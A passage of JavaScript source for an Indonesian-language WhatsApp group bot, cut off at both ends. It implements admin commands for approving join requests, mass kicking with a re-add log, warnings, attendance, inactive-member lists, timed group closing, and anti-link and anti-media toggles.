    reply(`✅ Semua member yang meminta bergabung sudah di-ACC (${pending.length} orang).`);
  } else {
    let jumlah = parseInt(args[0]);
    if (isNaN(jumlah) || jumlah < 1) return reply('Masukkan jumlah yang valid!\nContoh: .acc 1 atau .acc all');

    let selected = pending.slice(0, jumlah);
    await Alice.groupRequestParticipantsUpdate(m.chat, selected.map(u => u.jid), 'approve');
    reply(`✅ Berhasil ACC ${selected.length} member yang meminta gabung.`);
  }
}
break;
case 'kickall': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.')
  if (!isAdmins && !isCreator) return reply('❌ Hanya admin atau owner bot.')

  const fs = require('fs')
  const moment = require('moment-timezone')
  const path = './AliceSystem/AliceDatabase/Group/kicklog.json'
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

  if (!fs.existsSync('./AliceSystem/AliceDatabase/Group')) {
    fs.mkdirSync('./AliceSystem/AliceDatabase/Group', { recursive: true })
  }

  let kickLog = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {}
  let dataKick = []

  const botId = Alice.user.id.split(':')[0]

  for (let p of participants) {
    const userId = p.id
    if (userId.includes(botId) || userId === m.sender) continue

    try {
      await Alice.groupParticipantsUpdate(m.chat, [userId], 'remove')
      const name = (await Alice.getName(userId)) || userId.split('@')[0]
      dataKick.push({
        id: userId,
        nama: name,
        waktu: moment().tz('Asia/Jakarta').format('D MMMM YYYY, HH:mm [WIB]')
      })
      await delay(500)
    } catch (err) {
      console.log(`❌ Gagal kick ${userId}`, err)
    }
  }

  kickLog[m.chat] = dataKick
  fs.writeFileSync(path, JSON.stringify(kickLog, null, 2))
  reply(`✅ ${dataKick.length} member telah dikeluarkan dan disimpan di log.`)
}
break

case 'addallback': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.');
  if (!isAdmins) return reply('❌ Hanya admin yang bisa mengatur');

const fs = require('fs')
const path = './AliceSystem/AliceDatabase/Group/kicklog.json.json'
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

  if (!fs.existsSync(path)) return reply('📭 Tidak ada data kick.')
  let kickLog = JSON.parse(fs.readFileSync(path))
  let data = kickLog[m.chat]
  if (!data || data.length === 0) return reply('📭 Tidak ada yang bisa dikembalikan.')

  let sukses = 0, gagal = 0
  for (let user of data) {
    try {
      await Alice.groupParticipantsUpdate(m.chat, [user.id], 'add')
      sukses++
      await delay(500)
    } catch (e) {
      gagal++
      await Alice.sendMessage(m.chat, {
        text: `⚠️ Tidak bisa mengundang @${user.id.split('@')[0]}

Mungkin mereka menonaktifkan:
*Privasi > Grup > Semua orang*

⏰ Dikeluarkan: *${user.waktu}*
👤 Nama: *${user.nama}*`,
        mentions: [user.id]
      })
    }
  }

  delete kickLog[m.chat]
  fs.writeFileSync(path, JSON.stringify(kickLog, null, 2))
  reply(`🔁 *Selesai mengembalikan*\n✅ Berhasil: ${sukses}\n❌ Gagal: ${gagal}`)
}
break

case 'kicklog': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.');
  if (!isAdmins) return reply('❌ Hanya admin yang bisa mengatur');

  const fs = require('fs')
  const path = './AliceSystem/AliceDatabase/Group/kicklog.json'

  if (!fs.existsSync(path)) return reply('📭 Tidak ada data kick ditemukan.')

  const kickLog = JSON.parse(fs.readFileSync(path))
  const data = kickLog[m.chat]

  if (!data || data.length === 0) return reply('📭 Tidak ada yang dikick di grup ini.')

  // Format teks log
  let teks = `📄 *LOG ANGGOTA YANG DIKELUARKAN:*\n`
  teks += `Grup: ${groupName}\nTotal: ${data.length} member\n`
  teks += `──────────────────────\n`

  for (let i = 0; i < data.length; i++) {
    let u = data[i]
    teks += `🧍 *${i + 1}.* ${u.nama}\n📱 @${u.id.split('@')[0]}\n🕒 ${u.waktu}\n\n`
  }

  // Kalau terlalu panjang (lebih dari 4000 karakter), kirim sebagai file txt
  if (teks.length > 4000) {
    const filePath = './tmp/kicklog.txt'
    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true })
    fs.writeFileSync(filePath, teks)
    await Alice.sendMessage(m.chat, {
      document: fs.readFileSync(filePath),
      fileName: 'kicklog.txt',
      mimetype: 'text/plain',
      caption: `📎 Kicklog disimpan sebagai file (panjang melebihi batas).`
    }, { quoted: m })
  } else {
    Alice.sendMessage(m.chat, {
      text: teks.trim(),
      mentions: data.map(v => v.id)
    }, { quoted: m })
  }
}
break

case 'clearkicklog': {
  if (!m.isGroup) return reply('❌ Hanya bisa digunakan di grup.')
  if (!isAdmins && !isCreator) return reply('❌ Hanya admin grup atau owner bot.')

  const fs = require('fs')
  const path = './AliceSystem/AliceDatabase/Group/kicklog.json'

  if (!fs.existsSync(path)) return reply('📭 Tidak ada file log kick.')

  let kickLog = JSON.parse(fs.readFileSync(path))

  if (!kickLog[m.chat]) return reply('✅ Tidak ada log kick tersimpan untuk grup ini.')

  delete kickLog[m.chat]
  fs.writeFileSync(path, JSON.stringify(kickLog, null, 2))

  reply('🧹 Log kick untuk grup ini berhasil dihapus.')
}
break

case 'setwelcome': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.');
  if (!isAdmins && !isOwner) return reply('❌ Hanya admin yang bisa mengatur teks welcome.');
  
  if (!text) return reply(`📌 Format:\n.setwelcome Teks sambutan\n\nGunakan:\n@user → mention pengguna\n@group → nama grup\n@tanggal → tanggal hari ini`);

  let db = JSON.parse(fs.readFileSync('./AliceDatabase/groupWelcome.json'))
  if (!db[m.chat]) db[m.chat] = {}

  db[m.chat].welcome = text
  fs.writeFileSync('./AliceDatabase/groupWelcome.json', JSON.stringify(db, null, 2))
  reply('✅ Teks welcome berhasil diperbarui.')
  break
}

case 'setleft': {
  if (!m.isGroup) return reply('❌ Hanya bisa di dalam grup.');
  if (!isAdmins && !isOwner) return reply('❌ Hanya admin yang bisa mengatur teks left.');

  if (!text) return reply(`📌 Format:\n.setleft Teks keluar\n\nGunakan:\n@user → mention pengguna\n@group → nama grup\n@tanggal → tanggal hari ini`);

  let db = JSON.parse(fs.readFileSync('./AliceDatabase/groupWelcome.json'))
  if (!db[m.chat]) db[m.chat] = {}

  db[m.chat].left = text
  fs.writeFileSync('./AliceDatabase/groupWelcome.json', JSON.stringify(db, null, 2))
  reply('✅ Teks left berhasil diperbarui.')
  break
}
      case "totalchat":
      case "totalpesan":
        {
          if (!global.db.data.chats[m.chat]?.totalChat) {
            return reply("Tidak ada data chat.");
          }
          if (text && text == "reset") {
            global.db.data.chats[m.chat].totalChat = {};
            return reply("Total chat telah di reset untuk grup ini.");
          }
          const entries = Object.entries(global.db.data.chats[m.chat].totalChat);
          const total = await Promise.all(entries.map(async ([index, value], i) => {
            return `${i + 1}. @${index.split("@")[0]} : ${value} pesan`;
          }));
          reply(`*\`ᴛᴏᴛᴀʟ ᴄʜᴀᴛs ɢʀᴏᴜᴘ ᴀʟʟ ᴜsᴇʀ ${await Alice.getName(m.chat)}\`*:\n\n${total.join("\n")}`);
        }
        break;

case 'cekasalmember' : {
if (!m.isGroup) return XRG()
if (isBan) return XRB()
await XReaction()
const participants = await Alice.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  let member = groupMetadata.participants.length;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = 
  `
┌─⊷ *ASAL NEGARA*
Jumlah Anggota Grup Berdasarkan Negara:
🇮🇩 • Indonesia: ${countIndonesia}
🇲🇾 • Malaysia: ${countMalaysia}
🇺🇲 • USA + OTHER : ${countUSA}
🏳️ • Negara Lain: ${countOther}
👥 • jumlah semua mmeber: ${member}
└──────────────
`;

  reply(replyMessage);
}
break
case 'warn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const target = mentionUser[0];
    if (!target) return Alice.sendMessage(m.chat, { text: 'Tag user yang ingin diberikan peringatan.' });

    const groupWarn = warnData[m.chat] || { maxWarn: 3, warns: {} };
    groupWarn.warns[target] = (groupWarn.warns[target] || 0) + 1;

    if (groupWarn.warns[target] >= groupWarn.maxWarn) {
      delete groupWarn.warns[target];
      await Alice.groupParticipantsUpdate(m.chat, [target], 'remove');
      Alice.sendMessage(m.chat, {
        text: `User @${target.split('@')[0]} telah mencapai batas peringatan dan telah dikeluarkan.`,
        mentions: [target],
      });
    } else {
      Alice.sendMessage(m.chat, {
        text: `User @${target.split('@')[0]} telah diberi peringatan (${groupWarn.warns[target]}/${groupWarn.maxWarn}).`,
        mentions: [target],
      });
    }

    warnData[m.chat] = groupWarn;
    saveWarnData();
    }
break;
case 'warninfo': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });

    try {
        const metadata = await Alice.groupMetadata(m.chat);
        const groupName = metadata.subject;
        const groupWarn = warnData[m.chat] || { maxWarn: 3, warns: {} };
        const totalWarned = Object.keys(groupWarn.warns).length;
        const warnList = Object.entries(groupWarn.warns)
            .map(([user, count]) => `• @${user.split('@')[0]} (${count}/${groupWarn.maxWarn})`)
            .join('\n') || 'Tidak ada user yang mendapat peringatan.';

        const warnInfoText = `╭─── *「 ${groupName} 」*\n` +
            `│ *Max Warn:* ${groupWarn.maxWarn}\n` +
            `│ *Total User:* ${totalWarned}\n` +
            `╰──────────────\n\n` +
            `*List User:*\n${warnList}`;

        Alice.sendMessage(m.chat, { text: warnInfoText, mentions: Object.keys(groupWarn.warns) });
    } catch (err) {
        console.error(err);
        Alice.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil metadata grup.' });
    }
    }
break;
case 'setwarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const maxWarn = parseInt(args[0]);
    if (isNaN(maxWarn) || maxWarn <= 0) return Alice.sendMessage(m.chat, { text: 'Masukkan jumlah maksimal peringatan yang valid.' });

    const groupWarn = warnData[m.chat] || { maxWarn: 3, warns: {} };
    groupWarn.maxWarn = maxWarn;

    warnData[m.chat] = groupWarn;
    saveWarnData();

    Alice.sendMessage(m.chat, { text: `Jumlah maksimal peringatan di grup ini telah diatur menjadi ${maxWarn}.` });
    }
break;
case 'delwarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    const target = mentionUser[0];
    if (!target) return Alice.sendMessage(m.chat, { text: 'Tag user yang ingin dihapus peringatannya.' });

    const warnCount = parseInt(args[1]);
    if (isNaN(warnCount) || warnCount <= 0) return Alice.sendMessage(m.chat, { text: 'Masukkan jumlah peringatan yang valid untuk dihapus.' });

    const groupWarn = warnData[m.chat] || { maxWarn: 3, warns: {} };
    if (!groupWarn.warns[target]) return Alice.sendMessage(m.chat, { text: 'User ini tidak memiliki peringatan.' });

    if (groupWarn.warns[target] < warnCount) {
      return Alice.sendMessage(m.chat, { text: `User ini hanya memiliki ${groupWarn.warns[target]} peringatan.` });
    }

    groupWarn.warns[target] -= warnCount;
    if (groupWarn.warns[target] <= 0) delete groupWarn.warns[target];

    warnData[m.chat] = groupWarn;
    saveWarnData();

    Alice.sendMessage(m.chat, {
      text: `Peringatan sebanyak ${warnCount} untuk user @${target.split('@')[0]} telah dihapus.`,
      mentions: [target],
    });
    }
break;
case 'reswarn': {
    if (!m.isGroup) return Alice.sendMessage(m.chat, { text: 'Fitur ini hanya untuk grup.' });
    if (!isAdmins) return Alice.sendMessage(m.chat, { text: 'Kamu bukan admin grup.' });

    if (!warnData[m.chat]) return Alice.sendMessage(m.chat, { text: 'Tidak ada data peringatan di grup ini.' });

    delete warnData[m.chat];
    saveWarnData();

    Alice.sendMessage(m.chat, { text: 'Semua peringatan di grup ini telah dihapus.' });
    }
break;

case 'autobio':
if (!isOwner) return XRO()
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autobio = true
reply('autobio aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autobio = false
reply('autobio di matikan')
} else reply('on / off')
break

case 'autodownload':
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isAdmins && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break

case 'resetsider': {
if (!isAdmins) return XRA()
    if (db_sider && db_sider[m.chat]) {
      delete db_sider[m.chat];
      fs.writeFileSync('./AliceSystem/AliceDatabase/Group/sider.json', JSON.stringify(db_sider));
      reply("_Sider Berhasil Direset Pada Grub ini_")
    } else {
      reply("_Sider Sudah Direset Pada Grub ini_")
    }
}
break
case 'gcsider' : {
await Alice.sendPresenceUpdate('composing', m.chat)
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.data.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.data.users[member[i]].lastseen > lama) && !users.isAdmin) {
            if (typeof global.db.data.users[member[i]] !== 'undefined') {
                if (global.db.data.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return reply(m.chat, `*Digrup ini tidak terdapat sider.*`, xy)
    reply(m.chat, `*${total}/${sum}* anggota grup *${await Alice.getName(m.chat)}* adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ @' + v.replace(/@.+/, '' + typeof global.db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.data.users[v].lastseen))).join('\n')}`, m, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}
break

case 'listabsen': {
    if (!isAdmins) return XRA()
    if (!m.isGroup) return XRG()
    if (db_absen[m.chat+hariini]) {
    let stringAbsen = `*LIST ABSEN [ ${hariini} ]*\n\n`
    stringAbsen += db_absen[m.chat+hariini].map(absen => `⭔ @${absen.user_id.split('@')[0]} \n`).join('');    

    let arr_listabsen   = db_absen[m.chat+hariini].map(absen => ({ id: absen.user_id }));
    let jumlahOrangAbsen= arr_listabsen.length;
    let total_orgdgrub  = participants.length;

    let lomAbsen        = total_orgdgrub - jumlahOrangAbsen

    if (lomAbsen == 0) {
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen Semua`
    }else{
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen, Tersisa ${lomAbsen} Orang`
    }

    Alice.sendMessage(m.chat, { text: stringAbsen, mentions: arr_listabsen.map(a => a.id) }, { quoted: m })

    } else{
        return reply('Belum ada absen hari ini')
    }
}
break
case 'absen': {
    if (!m.isGroup) return XRG()
    if (!db_absen[m.chat+hariini]) {

        // pertama absen
        db_absen[m.chat+hariini] = [{ user_id: sender, tanggal: hariini }];
        reply('Absen Berhasil')
    }else {

        // absen kedua
      const sudah_absen = db_absen[m.chat+hariini].findIndex(item => item.user_id === sender);

      if (sudah_absen !== -1) {
            reply('Kamu sudah absen hari ini')
        }else {
            reply('Absen Berhasil')
            db_absen[m.chat+hariini].push({ user_id: sender, tanggal: hariini });
        }
          
    }

 fs.writeFileSync('./AliceSystem/AliceDatabase/Group//absen.json', JSON.stringify(db_absen))

}
break

	case 'closetime': {
  if (!m.isGroup) return reply("⛔ Hanya grup.")
  if (!isAdmins && !isOwner) return reply("⛔ Admin only.")
  if (!isBotAdmins) return reply("⛔ Bot harus admin.")

  if (!args[0] || !args[1]) return reply("Contoh: .closetime 10 minute")

  let timeVal = parseInt(args[0])
  if (isNaN(timeVal)) return reply("Masukkan angka yang valid.")

  let timer
  if (args[1] === 'second') timer = timeVal * 1000
  else if (args[1] === 'minute') timer = timeVal * 60000
  else if (args[1] === 'hour') timer = timeVal * 3600000
  else return reply("Pilih waktu: second/minute/hour")

  reply(`⏳ Grup akan ditutup dalam ${timeVal} ${args[1]}...`)
  setTimeout(() => {
    Alice.groupSettingUpdate(m.chat, 'announcement')
    reply('🔒 Grup telah ditutup.')
  }, timer)
}
break;
            case 'opentime':
                if (!m.isGroup) return reply("*[ sʏsᴛᴇᴍ ]* ᴋʜᴜsᴜs ɢʀᴏᴜᴘ ᴅᴏᴀɴɢ")
                if (!isAdmins && !isOwner) return XRA()
                if (!isBotAdmins) return reply("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                reply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    Alice.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break


case 'group':
case 'setgroup': 
case 'groupset': 
case 'setgc':{
if(!isOwner) return XRA()
const caption = `Silahkan Dipilih Atmin`;
let sections = [
{
highlight_label: 'Alice Antilinkall',
rows: [{
title: 'Nyalakan Antilinkall',
id: `${Xyroo}antilinkall on`
}]
},
{
highlight_label: 'Alice Antilinkall',
rows: [{
title: 'Nyalakan Antilinkall',
id: `${Xyroo}antilinkall off`
}]
},
{
highlight_label: 'Alice Antilinkgc',
rows: [{
title: 'Nyalakan Antilinkgc',
id: `${Xyroo}antilinkgc on`
}]
},
{
highlight_label: 'Alice Antilinkgc',
rows: [{
title: 'Matikan Antilinkgc',
id: `${Xyroo}antilinkgc off`
}]
},
{
highlight_label: 'Alice Antitoxic',
rows: [{
title: 'Nyalakan Antitoxic',
id: `${Xyroo}antitoxic on`
}]
},
{
highlight_label: 'Alice Antitoxic',
rows: [{
title: 'Matikan Antitoxic',
id: `${Xyroo}antitoxic off`
}]
},
{
highlight_label: 'Alice AntiNomorAsing',
rows: [{
title: 'Nyalakan AntiNomorAsing',
id: `${Xyroo}antiasing on`
}]
},
{
highlight_label: 'Alice AntiNomorAsing',
rows: [{
title: 'Matikan AntiNomorAsing',
id: `${Xyroo}antiasing off`
}]
},
{
highlight_label: 'Alice Antilinkfb',
rows: [{
title: 'Nyalakan Antilinkfb',
id: `${Xyroo}antilinkfb on`
}]
},
{
highlight_label: 'Alice Antilinkfb',
rows: [{
title: 'Matikan Antilinkfb',
id: `${Xyroo}antilinkfb off`
}]
},
{
highlight_label: 'Alice Antilinkig',
rows: [{
title: 'Nyalakan Antilinkig',
id: `${Xyroo}antilinkig on`
}]
},
{
highlight_label: 'Alice Antilinkig',
rows: [{
title: 'Matikan Antilinkig',
id: `${Xyroo}antilinkig off`
}]
},
{
highlight_label: 'Alice Autodownload',
rows: [{
title: 'Nyalakan Autodownload',
id: `${Xyroo}autodownload on`
}]
},
{
highlight_label: 'Alice Autodownload',
rows: [{
title: 'Matikan Autodownload',
id: `${Xyroo}autodownload off`
}]
},
{
highlight_label: 'Alice Antivirtek',
rows: [{
title: 'Nyalakan Antivirtek',
id: `${Xyroo}antivirtex on`
}]
},
{
highlight_label: 'Alice Antivirtek',
rows: [{
title: 'Matikan Antivirtek',
id: `${Xyroo}antivirtex off`
}]
},
{
highlight_label: 'Alice Antilinkyt',
rows: [{
title: 'Nyalakan Antilinkyt',
id: `${Xyroo}antilinkyt on`
}]
},
{
highlight_label: 'Alice Antilinkyt',
rows: [{
title: 'Matikan Antilinkyt',
id: `${Xyroo}antilinkyt off`
}]
},
{
highlight_label: 'Alice Antilinktele',
rows: [{
title: 'Nyalakan Antilinktele',
id: `${Xyroo}antilinktele on`
}]
},
{
highlight_label: 'Alice Antilinktele',
rows: [{
title: 'Matikan Antilinktele',
id: `${Xyroo}antilinktele off`
}]
},
{
highlight_label: 'Alice Antilinkytch',
rows: [{
title: 'Nyalakan Antilinkytch',
id: `${Xyroo}antilinkytch on`
}]
},
{
highlight_label: 'Alice Antilinkytch',
rows: [{
title: 'Matikan Antilinkytch',
id: `${Xyroo}antilinkytch off`
}]
},
{
highlight_label: 'Alice AntiTiktok',
rows: [{
title: 'Nyalakan AntiTiktok',
id: `${Xyroo}antilinktiktok on`
}]
},
{
highlight_label: 'Alice AntiTiktok',
rows: [{
title: 'Matikan AntiTiktok',
id: `${Xyroo}antilinktiktok off`
}]
},
{
highlight_label: 'Alice Antilinktwitter',
rows: [{
title: 'Nyalakan Antilinktwitter',
id: `${Xyroo}antilinktwitter on`
}]
},
{
highlight_label: 'Alice Antilinktwitter',
rows: [{
title: 'Matikan Antilinktwitter',
id: `${Xyroo}antilinktwitter off`
}]
},
{
highlight_label: 'Alice Antilinkbokep',
rows: [{
title: 'Nyalakan Antilinkbokep',
id: `${Xyroo}antilinkbokep on`
}]
},
{
highlight_label: 'Alice Antilinkbokep',
rows: [{
title: 'Matikan Antilinkbokep',
id: `${Xyroo}antilinkbokep off`
}]
},
{
highlight_label: 'Alice Antilinkterabox',
rows: [{
title: 'Nyalakan Antilinkterabox',
id: `${Xyroo}ntilinkterabox on`
}]
},
{
highlight_label: 'Alice Antilinkterabox',
rows: [{
title: 'Matikan Antilinkterabox',
id: `${Xyroo}antilinkterabox off`
}]
},
{
highlight_label: 'Alice AntilinkMediafire',
rows: [{
title: 'Nyalakan AntilinkMediafire',
id: `${Xyroo}antilinkmediafire on`
}]
},
{
highlight_label: 'Alice AntilinkMediafire',
rows: [{
title: 'Matikan AntilinkMediafire',
id: `${Xyroo}antilinkmediafire off`
}]
},
{
highlight_label: 'Alice AntiPoll',
rows: [{
title: 'Nyalakan AntiPoll',
id: `${Xyroo}antipoll on`
}]
},
{
highlight_label: 'Alice AntiPoll',
rows: [{
title: 'Matikan AntiPoll',
id: `${Xyroo}antipoll off`
}]
},
{
highlight_label: 'Alice Antisticker',
rows: [{
title: 'Nyalakan Antisticker',
id: `${Xyroo}antisticker on`
}]
},
{
highlight_label: 'Alice Antisticker',
rows: [{
title: 'Matikan Antisticker',
id: `${Xyroo}antisticker off`
}]
},
{
highlight_label: 'Alice Antiimage',
rows: [{
title: 'Nyalakan Antiimage',
id: `${Xyroo}antiimage on`
}]
},
{
highlight_label: 'Alice Antiimage',
rows: [{
title: 'Matikan Antiimage',
id: `${Xyroo}antiimage off`
}]
},
{
highlight_label: 'Alice Antivideo',
rows: [{
title: 'Nyalakan Antivideo',
id: `${Xyroo}antivideo on`
}]
},
{
highlight_label: 'Alice Antivideo',
rows: [{
title: 'Matikan Antivideo',
id: `${Xyroo}antivideo off`
}]
},
{
highlight_label: 'Alice Antibot',
rows: [{
title: 'Nyalakan Antibot',
id: `${Xyroo}antibot on`
}]
},
{
highlight_label: 'Alice Antibot',
rows: [{
title: 'Matikan Antibot',
id: `${Xyroo}antibot off`
}]
},
{
highlight_label: 'Alice Antimedia',
rows: [{
title: 'Nyalakan Antimedia',
id: `${Xyroo}antimedia on`
}]
},
{
highlight_label: 'Alice Antimedia',
rows: [{
title: 'Matikan Antimedia',
id: `${Xyroo}antimedia off`
}]
},
{
highlight_label: 'Alice Antidocument',
rows: [{
title: 'Nyalakan Antidocument',
id: `${Xyroo}antidocument on`
}]
},
{
highlight_label: 'Alice Antidocument',
rows: [{
title: 'Matikan Antidocument',
id: `${Xyroo}antidocument off`
}]
},
{
highlight_label: 'Alice Anticontact',
rows: [{
title: 'Nyalakan Anticontact',
id: `${Xyroo}anticontact on`
}]
},
{
highlight_label: 'Alice Anticontact',
rows: [{
title: 'Matikan Anticontact',
id: `${Xyroo}anticontact off`
}]
},
{
highlight_label: 'Alice Antilocation',
rows: [{
title: 'Nyalakan Antilocation',
id: `${Xyroo}antilocation on`
}]
},
{
highlight_label: 'Alice Antilocation',
rows: [{
title: 'Matikan Antilocation',
id: `${Xyroo}antilocation off`
}]
},
{
highlight_label: 'Alice Antilinkkick',
rows: [{
title: 'Nyalakan Antilinkkick',
id: `${Xyroo}antilinkkick on`
}]
},
{
highlight_label: 'Alice Antilinkkick',
rows: [{
title: 'Matikan Antilinkkick',
id: `${Xyroo}antilinkkick off`
}]
},
{
highlight_label: 'Alice Antiaudio',
rows: [{
title: 'Nyalakan AntiAudio',
id: `${Xyroo}antiaudio on`
}]
},
{
highlight_label: 'Alice Antiaudio',
rows: [{
title: 'Matikan AntiAudio',
id: `${Xyroo}antiaudio off`
}]
},
{
highlight_label: 'Alice Group',
rows: [{
title: 'Buka Group',
id: `${Xyroo}gc open`
}]
},
{
highlight_label: 'Alice Group',
rows: [{
title: 'Tutup Group',
id: `${Xyroo}gc close`
}]
}]

let listMessage = {
    title: `Setting Group`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii Atmin`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

			case 'antispam':{
				if (!m.isGroup) return XRG()
				if (!isBotAdmins) return XRBADM
				if (!isAdmins) return XRA()
				if (args.length < 1) return reply('on/off?')
				if (args[0] === 'on') {
					db.data.chats[m.chat].antispam = true
					reply(`${command} is enabled`)
				} else if (args[0] === 'off') {
					db.data.chats[m.chat].antispam = false
					reply(`${command} is disabled`)
				}
			}
			break;
			
case 'antipoll':
        handleFeatureToggle('antipoll', command);
        break;

    case 'antisticker':
        handleFeatureToggle('antisticker', command);
        break;

    case 'antiimage':
        handleFeatureToggle('antiimage', command);
        break;

    case 'antivideo':
        handleFeatureToggle('antivideo', command);
        break;

    case 'antibot':
        handleFeatureToggle('antibot', command);
        break;
        
    case 'antiviewonce':
        handleFeatureToggle('antiviewonce', command);
        break;


    case 'antimedia':
        handleFeatureToggle('antimedia', command);
        break;

    case 'antidocument':
        handleFeatureToggle('antidocument', command);
        break;

    case 'anticontact':
        handleFeatureToggle('anticontact', command);
        break;

    case 'antilocation':
        handleFeatureToggle('antilocation', command);
        break;

    case 'antilinkgc':
        handleFeatureToggle('antilinkgc', command);
        break;

    case 'antipromotion':
        handleFeatureToggle('antipromotion', command);
        break;

    case 'antiaudio':
        handleFeatureToggle('antiaudio', command);
        break;
        
            case 'antilinkkick': {
                if (!m.isGroup) return XRG()
                if (!isAdmins) return XRA()
                if (!isBotAdmins) return XRBADM()
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkkick) return reply(`☘️ *Autokick Link Aktif*`)
                    db.data.chats[m.chat].antilinkkick = true
                    reply(`*Autokick Link Aktif*`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkkick) return reply(`*Autokick Link Di Nonatifkan*`)
                    db.data.chats[m.chat].antilinkkick = false
                    reply(`☘️ *Autokick Nonaktif*`)
                } else {
                    reply(`☘️ *Ketik ${XyrooRynzz} on/off*`)
                }
            }
            break        
                
case 'linkgc': {
  if (!m.isGroup) return reply('⛔ Hanya di grup.')
  if (!isAdmins) return reply('⛔ Admin only.')
  if (!isBotAdmins) return reply('⛔ Bot belum admin.')

  try {
    let response = await Alice.groupInviteCode(m.chat)
    return reply(`📎 Link grup:\nhttps://chat.whatsapp.com/${response}`)
  } catch (e) {
    return reply("❌ Gagal ambil link.")
  }
}
break;

case 'list': {
  if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
  if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list respon didalam grup ini!`)
  let teks = `Halo ${pushname}, Berikut adalah list respon digrup ini.\n\n`
  for (let i of db_respon_list) {
    if (i.id === m.chat) {
